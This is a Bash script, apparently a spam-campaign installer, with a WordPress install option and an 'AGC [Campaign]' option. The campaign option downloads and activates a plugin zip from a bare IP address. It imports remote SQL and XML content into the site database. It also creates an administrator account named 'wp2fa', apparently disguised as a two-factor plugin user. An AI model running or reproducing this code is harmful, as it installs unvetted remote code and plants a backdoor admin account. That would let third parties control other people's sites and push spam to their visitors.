#!/bin/bash 
# Reina Akiara v.0.1


#		---	PANG
red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
norm="\033[0m"

source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
sql_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.txt"
owner=$(echo -e "$(pwd)" | cut -d "/" -f3)
if [[ $(id | grep "root" ) ]]; then extra="--allow-root"; else extra=""; fi


_INSTALLWP() {
	echo -e ""
	#	----	VAR		----
	echo -e "[+][STEP 1]-----------------------------------"
	echo ""
	read -p $" [+] Directory name: " dir
	read -p $" [+] DB HOST       : " dbhost
	read -p $" [+] DB NAME       : " dbname
	read -p $" [+] DB USER       : " dbuser
	read -p $" [+] DB PASSWORD   : " dbpass
	read -p $" [+] DB PREFIX     : " dbprefix
	echo ""
	echo -e "[+][STEP 2]----------------------------------"
	echo ""
	read -p $" [+] URL [e.g:example.com/blog/]   : " url
	read -p $" [+] TITLE                         : " title
	read -p $" [+] ADMIN USERNAME                : " username
	read -p $" [+] ADMIN PASSWORD                : " password
	read -p $" [+] ADMIN EMAIL                   : " email

	echo -e ""
	echo -e "${blue}[~]${norm} Downloading Wordpress"
	wget -q https://wordpress.org/latest.zip && unzip -q "latest.zip" && rm -rf "latest.zip" && mv "wordpress" ${dir} && cd ${dir}
	
	echo -e "${blue}[~]${norm} Downloading wp-cli.phar..."
	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar

	#	Creating config file
	php wp-cli.phar core config --dbhost="${dbhost}" --dbname="${dbname}" --dbuser="${dbuser}" --dbpass="${dbpass}" --dbprefix="${dbprefix}" $extra
	php wp-cli.phar core install --url="${url}" --title="${title}" --admin_user="${username}" --admin_email="${email}" $extra
	php wp-cli.phar user list $extra

	echo -e "${blue}[~]${norm} Updating your default password..."
	php wp-cli.phar user update 1 --user_pass="${password}" $extra

	php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'siteurl'" $extra
	php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'home'" $extra
	
	echo -e "${green}[+]${norm} http://${url}/wp-login.php"
	echo -e "${green}[+] Username:${norm} ${username}${green} [+] password:${norm} ${password} | ${green}Have Fun ntol! ${norm}"

#
#	echo -e "[+] ========================================= [+]"
#	echo -e "[~] Changing Permalinks..."
#		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
#		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'" $extra
#		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'siteurl'" $extra
#		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'home'" $extra
#	echo -e "[~] Installing Plugin..."
#	php wp-cli.phar plugin install ${source_campaign} --activate $extra
	#php wp-cli.phar cron event list $extra

#	php wp-cli.phar plugin install wordpress-importer --activate $extra
#	wget ${xml_agc} -O agc.xml
#	php wp-cli.phar import agc.xml --authors=create $extra
#	sed -i -e 's/blogwpx_/'"$(php wp-cli.phar db prefix $extra)"'/g' agc.sql
#	php wp-cli.phar db import agc.sql
#	php wp-cli.phar user create ${username} admin@gmail.com --role=administrator
#	echo -e "[+] Username: ${username}"

	#	ENTERING KEYWORD
	#php wp-cli.phar db query "DROP TABLE IF EXISTS $(php wp-cli.phar db prefix $extra)wp_api_keys" $extra

	#	CREATING wp_api_keys TABLE
	#echo -e "[~] CREATING wp_api_keys TABLE"

	#php wp-cli.phar db query "CREATE TABLE $(php wp-cli.phar db prefix $extra)wp_api_keys ( id int(11) NOT NULL AUTO_INCREMENT,idmd5 varchar(50) CHARACTER SET latin1 NOT NULL,title text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,slug text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,category varchar(10) COLLATE utf8mb4_unicode_520_ci NOT NULL,target_uv varchar(10) COLLATE utf8mb4_unicode_520_ci NOT NULL,status varchar(10) COLLATE utf8mb4_unicode_520_ci NOT NULL, PRIMARY KEY (id),  UNIQUE KEY idmd5 (idmd5)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci" $extra
	
	#	CREATING wp_api_keys TABLE
	#echo -e "[~] CREATING wp_api_keys TABLE"

	#php wp-cli.phar db query "INSERT INTO $(php wp-cli.phar db prefix $extra)wp_api_keys ( id , idmd5 , title , slug , category , target_uv , status ) VALUES ( 1 , "


	# 	wp core config --dbhost=host.db --dbname=prefix_db --dbuser=username --dbpass=password
	#	wp core install --url=yourwebsite.com --title="Your Blog Title" --admin_name=wordpress_admin --admin_password=4Long&Strong1 --admin_email=you@example.com
}
_INSTALLAGC() {
	username="wp2fa"

	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar

	echo -e "${blue}[~]${norm} Changing Permalinks..."
		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'"
		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'"
	echo -e "${blue}[~]${norm} Installing Plugin..."
	php wp-cli.phar plugin install ${source_campaign} --activate
	#php wp-cli.phar cron event list $extra

	php wp-cli.phar plugin install wordpress-importer --activate
	wget ${xml_agc} -O agc.xml
	php wp-cli.phar import agc.xml --authors=create
	wget ${sql_agc} -O agc.sql
	sed -i -e 's/blogwpx_/'"$(php wp-cli.phar db prefix $extra)"'/g' agc.sql
	php wp-cli.phar db import agc.sql
	php wp-cli.phar user create ${username} adminwordpress@mailwordpress.com --role=administrator
	echo -e "${green}[+] Username:${norm} ${username}"
}



echo -ne "${blue}[~]${norm} Checking WP-CLI.phar is supported or not...\r" && sleep 0.8
curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
if [[ $(php wp-cli.phar $extra | grep "WP-CLI only works correctly from the command line") ]];
then
	echo -e "${red}[!]${norm} Sorry, Wp-cli is not supported!" && exit
else
	echo -e "${green}[+]${norm} Congrats, Wp-cli is supported!\r" && sleep 0.8
fi

rm -rf "wp-cli.phar"

echo -e "


   ██████╗ ███████╗██╗███╗   ██╗ █████╗      █████╗ ██╗  ██╗██╗ █████╗ ██████╗  █████╗ 
   ██╔══██╗██╔════╝██║████╗  ██║██╔══██╗    ██╔══██╗██║ ██╔╝██║██╔══██╗██╔══██╗██╔══██╗
   ██████╔╝█████╗  ██║██╔██╗ ██║███████║    ███████║█████╔╝ ██║███████║██████╔╝███████║
   ██╔══██╗██╔══╝  ██║██║╚██╗██║██╔══██║    ██╔══██║██╔═██╗ ██║██╔══██║██╔══██╗██╔══██║
   ██║  ██║███████╗██║██║ ╚████║██║  ██║    ██║  ██║██║  ██╗██║██║  ██║██║  ██║██║  ██║
   ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                                                                                    

"


echo -e "
  ===============================

    [1] Install Wordpress
    [2] Install AGC [Campaign]

 ===============================
"
read -p $": Select Option : " option

if [[ $option == "1" ]];
	then
		_INSTALLWP 
elif [[ $option == "2" ]];
	then
		_INSTALLAGC
elif [[ $option == "0" ]];
	then
		exit
else
	echo -e "Pilihen Goblok!"
fi


rm -rf "agc.sql"
rm -rf "agc.xml" && rm -rf "wp-cli.phar"
#	php wp-cli.phar db query "UPDATE wp_options SET option_value = '%postname%' WHERE option_name = 'permalink_structure'"


#	php wp-cli.phar plugin install wordpress-importer --activate
#	wget import https://raw.githubusercontent.com/rootraven04/named/main/agc.xml 
#	php wp-cli.phar import agc.xml --authors=create


# php -r "$msgid = "";$oldMessage = 'blogwpx_';$deletedFormat = '$(php wp-cli.phar db prefix $extra)';$str=file_get_contents('agc.sql');$str=str_replace($oldMessage, $deletedFormat,$str);file_put_contents('agc.sql', $str);"
